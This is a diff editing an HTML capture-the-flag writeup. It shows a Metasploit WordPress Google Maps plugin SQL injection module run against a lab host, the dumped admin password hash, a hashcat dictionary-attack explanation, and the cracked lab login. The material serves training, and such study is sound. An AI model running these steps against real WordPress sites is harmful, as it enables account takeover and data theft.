@@ -1,13 +1,13 @@
 <html>
 
 <head>
-    <title>Random Easy CTF Writeup</title>
+    <title>Random boot2root CTF Writeup</title>
     <link rel="stylesheet" type="text/css" href="index.css">
 </head>
 
 <body>
     <article>
-        <h1>Random Easy CTF Writeup</h1>
+        <h1>Random boot2root CTF Writeup</h1>
         <p class="last-update">Last update on November 2019.</p>
 
         <div class="step">
@@ -219,27 +219,6 @@
                     target="_blank">Google Maps Plugin SQL Injection</a>. So, once again, we returned to Metasploit.</p>
             <div class="code-block">
                 <div class="code-line">
-                    <span class="prompt">root@kali:/#</span>
-                    <code>service postgresql start</code>
-                </div>
-                <br />
-                <div class="code-line">
-                    <span class="prompt">root@kali:/#</span>
-                    <code>msfconsole</code>
-                </div>
-                <div class="code-line">
-                    <code>...</code>
-                </div>
-                <br />
-                <div class="code-line">
-                    <span class="prompt">msf5 > </span>
-                    <code>db_status</code>
-                </div>
-                <div class="code-line">
-                    <code>[*] Connected to msf. Connection type: postgresql.</code>
-                </div>
-                <br />
-                <div class="code-line">
                     <span class="prompt">msf5 > </span>
                     <code>use auxiliary/admin/http/wp_google_maps_sqli </code>
                 </div>
@@ -266,7 +245,7 @@
                     <code>[+] Credentials saved in: /root/.msf4/loot/20191122164904_default_172.16.202.21_wp_google_maps.j_463939.bin</code>
                 </div>
                 <div class="code-line">
-                    <code>[+] 172.16.202.21:80 - <span style="color: red;">Found webmaster $P$BsqOdiLTcye6AS1ofreys4GzRlRvSr1 webmaster@none.local</span></code>
+                    <code>[+] 172.16.202.21:80 - Found <span style="color: red;">webmaster $P$BsqOdiLTcye6AS1ofreys4GzRlRvSr1</span> webmaster@none.local</code>
                 </div>
                 <div class="code-line">
                     <code>[*] Auxiliary module execution completed</code>
@@ -284,7 +263,7 @@
                         Wordpress MD5 hash.
                     </li>
                     <li>
-                        The <strong>a flag</strong> corresponds to the attack mode, which in this case is a <a href="https://hashcat.net/wiki/doku.php?id=dictionary_attack" target="_blank">dictionary attack</a> , more specifically with the RockYou wordlist.
+                        The <strong>a flag</strong> corresponds to the attack mode, which in this case is a <a href="https://hashcat.net/wiki/doku.php?id=dictionary_attack" target="_blank">dictionary attack</a> , more specifically with the Rockyou wordlist.
                     </li>
                 </ul>
             </span>
@@ -297,8 +276,7 @@
         </div>
 
         <div class="step">
-            <p>10. Now we have the credentials to the login to the WP <a href="http://172.16.202.21/wp-admin"
-                    target="_blank">admin console</a>: webmaster/kittykat1</p>
+            <p>10. With this, we can now log in to the <strong>wp-admin</strong> portal</a> with the following credentials: webmaster/kittykat1.</p>
         </div>
 
     </article>
